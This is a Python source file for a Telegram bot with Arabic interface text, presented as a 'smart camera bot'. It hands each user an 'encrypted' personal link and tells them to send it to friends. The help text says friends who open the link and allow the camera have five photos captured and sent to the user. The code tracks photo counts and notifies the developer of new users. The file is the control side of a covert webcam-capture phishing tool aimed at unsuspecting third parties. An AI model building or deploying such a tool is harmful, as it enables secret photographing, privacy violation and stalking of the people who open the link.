import time
from datetime import datetime
import telebot
from telebot.types import BotCommand, BotCommandScopeDefault, BotCommandScopeChat
from config import TOKEN, DEVELOPER_CHAT_ID, BASE_URL, logger, load_data, save_data
from encryption import encrypt_id

bot = telebot.TeleBot(TOKEN)

# تحميل البيانات
data = load_data()
user_stats = data.get("user_stats", {})
total_photos_received = data.get("total_photos_received", 0)

def save_user_data():
    """حفظ بيانات المستخدمين"""
    data["user_stats"] = user_stats
    data["total_photos_received"] = total_photos_received
    save_data(data)

def setup_bot_commands():
    """إعداد قائمة الأوامر"""
    try:
        # الأوامر العامة
        general_commands = [
            BotCommand("start", "🚀 بدء استخدام البوت"),
            BotCommand("stats", "📊 عرض إحصائياتك"),
            BotCommand("help", "❓ المساعدة")
        ]
        bot.set_my_commands(general_commands, scope=BotCommandScopeDefault())
        
        # أوامر المطور
        if DEVELOPER_CHAT_ID:
            dev_commands = [
                BotCommand("start", "🚀 بدء"),
                BotCommand("stats", "📊 إحصائياتي"),
                BotCommand("help", "❓ مساعدة"),
                BotCommand("adminstats", "📈 إحصائيات البوت"),
                BotCommand("broadcast", "📢 إرسال للجميع"),
                BotCommand("userslist", "👥 قائمة المستخدمين")
            ]
            bot.set_my_commands(dev_commands, scope=BotCommandScopeChat(chat_id=DEVELOPER_CHAT_ID))
        
        logger.info("Bot commands setup completed")
        return True
    except Exception as e:
        logger.error(f"Failed to setup commands: {e}")
        return False

def update_bot_profile():
    """تحديث الملف الشخصي للبوت"""
    try:
        total_users = len(user_stats)
        description = (
            f"📸 بوت الكاميرا الذكية\n"
            f"👥 عدد المستخدمين: {total_users}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}\n\n"
            f"✨ أرسل /start للحصول على رابطك الشخصي"
        )
        bot.set_my_description(description)
        bot.set_my_short_description(f"📸 بوت الكاميرا | {total_users} مستخدم")
        logger.info(f"Bot profile updated - Users: {total_users}")
    except Exception as e:
        logger.error(f"Failed to update profile: {e}")

def notify_developer(message_text):
    """إرسال إشعار للمطور"""
    try:
        bot.send_message(DEVELOPER_CHAT_ID, message_text, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Failed to notify developer: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name
    username = message.from_user.username or "لا يوجد"
    is_new = False
    
    # تسجيل المستخدم
    if user_id not in user_stats:
        is_new = True
        user_stats[user_id] = {
            "name": user_name,
            "username": username,
            "photo_count": 0,
            "first_seen": datetime.now().isoformat(),
            "last_active": datetime.now().isoformat(),
            "links_shared": 0
        }
        save_user_data()
        update_bot_profile()
        
        # إشعار للمطور
        notify_developer(
            f"🆕 *مستخدم جديد!*\n\n"
            f"👤 {user_name}\n"
            f"🆔 `{user_id}`\n"
            f"📝 @{username}\n"
            f"👥 المجموع: {len(user_stats)}"
        )
    else:
        user_stats[user_id]["last_active"] = datetime.now().isoformat()
        user_stats[user_id]["name"] = user_name
        user_stats[user_id]["username"] = username
        save_user_data()
    
    # إنشاء الرابط المشفر
    encrypted = encrypt_id(user_id)
    personal_link = f"{BASE_URL}?q={encrypted}"
    
    # زيادة عدد مشاركات الرابط
    user_stats[user_id]["links_shared"] = user_stats[user_id].get("links_shared", 0) + 1
    save_user_data()
    
    # إعداد الأزرار
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    btn_camera = telebot.types.InlineKeyboardButton("📸 افتح الكاميرا", url=personal_link)
    btn_stats = telebot.types.InlineKeyboardButton("📊 إحصائياتي", callback_data="stats")
    btn_help = telebot.types.InlineKeyboardButton("❓ تعليمات", callback_data="help")
    markup.add(btn_camera)
    markup.add(btn_stats, btn_help)
    
    # رسالة الترحيب
    response = (
        f"🎉 *أهلاً بك {user_name}!*\n\n"
        f"👥 *مستخدمي البوت:* {len(user_stats)}\n\n"
        f"✨ *رابطك الشخصي:*\n"
        f"`{personal_link}`\n\n"
        f"📌 *الطريقة:*\n"
        f"1️⃣ انسخ الرابط\n"
        f"2️⃣ أرسله لأصدقائك\n"
        f"3️⃣ سيتم التقاط 5 صور وإرسالها لك\n\n"
        f"🔒 الرابط مشفر بالكامل"
    )
    bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
    logger.info(f"User: {user_name} (ID: {user_id}) - New: {is_new}")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.chat.id
    if user_id in user_stats:
        stat = user_stats[user_id]
        first = datetime.fromisoformat(stat['first_seen'])
        last = datetime.fromisoformat(stat['last_active'])
        
        response = (
            f"📊 *إحصائياتك*\n\n"
            f"👤 الاسم: {stat['name']}\n"
            f"🆔 المعرف: `{user_id}`\n"
            f"📸 الصور: {stat['photo_count']}\n"
            f"🔗 مشاركات الرابط: {stat.get('links_shared', 0)}\n"
            f"📅 التسجيل: {first.strftime('%Y-%m-%d')}\n"
            f"🕐 آخر نشاط: {last.strftime('%H:%M')}\n\n"
            f"🌐 *عام:*\n"
            f"👥 المستخدمين: {len(user_stats)}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}"
        )
    else:
        response = "❌ استخدم /start أولاً"
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def send_help(message):
    user_id = message.chat.id
    is_dev = (user_id == DEVELOPER_CHAT_ID)
    
    help_text = (
        f"📖 *دليل الاستخدام*\n\n"
        f"👥 *المستخدمين:* {len(user_stats)}\n\n"
        f"🎯 *الأوامر:*\n"
        f"/start - الحصول على رابطك\n"
        f"/stats - إحصائياتك\n"
        f"/help - هذه المساعدة\n"
    )
    
    if is_dev:
        help_text += (
            f"\n👨‍💻 *أوامر المطور:*\n"
            f"/adminstats - إحصائيات كاملة\n"
            f"/broadcast - رسالة للجميع\n"
            f"/userslist - قائمة المستخدمين\n"
        )
    
    help_text += (
        f"\n🔧 *كيف يعمل:*\n"
        f"1. احصل على رابطك من /start\n"
        f"2. أرسله لأصدقائك\n"
        f"3. يفتحون الرابط ويسمحون بالكاميرا\n"
        f"4. تصل إليك 5 صور تلقائياً"
    )
    
    bot.send_message(user_id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['adminstats'])
def admin_stats(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    
    total_users = len(user_stats)
    total_photos = total_photos_received
    
    # المستخدمين النشطين اليوم
    today = datetime.now().replace(hour=0, minute=0, second=0)
    active_today = sum(1 for u in user_stats.values() 
                       if datetime.fromisoformat(u['last_active']) > today)
    
    # أكثر 5 مستخدمين
    top = sorted(user_stats.items(), key=lambda x: x[1].get('photo_count', 0), reverse=True)[:5]
    top_text = "\n".join([f"{i+1}. {u[1]['name']} - {u[1].get('photo_count', 0)} صورة" for i, u in enumerate(top)])
    
    response = (
        f"📊 *إحصائيات البوت*\n\n"
        f"👥 المستخدمين: {total_users}\n"
        f"🖼️ إجمالي الصور: {total_photos}\n"
        f"⭐ نشط اليوم: {active_today}\n\n"
        f"🏆 *الأكثر نشاطاً:*\n{top_text}\n\n"
        f"🕐 آخر تحديث: {datetime.now().strftime('%H:%M:%S')}"
    )
    bot.send_message(DEVELOPER_CHAT_ID, response, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    
    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ استخدم: /broadcast النص")
        return
    
    msg_text = parts[1]
    success = 0
    fail = 0
    
    for uid in user_stats.keys():
        try:
            bot.send_message(uid, f"📢 *إشعار:*\n\n{msg_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.05)
        except:
            fail += 1
    
    bot.reply_to(message, f"✅ تم الإرسال!\n✓ {success} نجح\n✗ {fail} فشل")

@bot.message_handler(commands=['userslist'])
def users_list(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    
    if not user_stats:
        bot.send_message(DEVELOPER_CHAT_ID, "📭 لا يوجد مستخدمين")
        return
    
    text = "👥 *قائمة المستخدمين:*\n\n"
    for uid, stat in user_stats.items():
        text += f"• {stat['name']} (@{stat['username']})\n"
        text += f"  🆔 `{uid}` | 📸 {stat['photo_count']}\n"
    
    if len(text) > 4000:
        import io
        file = io.BytesIO(text.encode())
        file.name = "users.txt"
        bot.send_document(DEVELOPER_CHAT_ID, file)
    else:
        bot.send_message(DEVELOPER_CHAT_ID, text, parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    global total_photos_received
    user_id = message.chat.id
    user_name = message.from_user.first_name
    username = message.from_user.username or "لا يوجد"
    
    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["last_active"] = datetime.now().isoformat()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "username": username,
            "photo_count": 1,
            "first_seen": datetime.now().isoformat(),
            "last_active": datetime.now().isoformat(),
            "links_shared": 0
        }
    
    total_photos_received += 1
    save_user_data()
    update_bot_profile()
    
    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024
    
    caption = (
        f"✅ *صورة جديدة!*\n\n"
        f"👤 {user_name}\n"
        f"🆔 `{user_id}`\n"
        f"📏 {file_size:.1f} KB\n"
        f"📸 صورك: {user_stats[user_id]['photo_count']}\n"
        f"📊 الإجمالي: {total_photos_received}"
    )
    bot.reply_to(message, caption, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "stats":
        show_stats(call.message)
    elif call.data == "help":
        send_help(call.message)
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: True)
def handle_all(message):
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❌ أمر غير معروف\nاستخدم /help للتعليمات")
    else:
        bot.reply_to(message, f"👋 مرحباً {message.from_user.first_name}\nاستخدم /start للبدء")

def get_bot():
    return bot, user_stats, total_photos_received
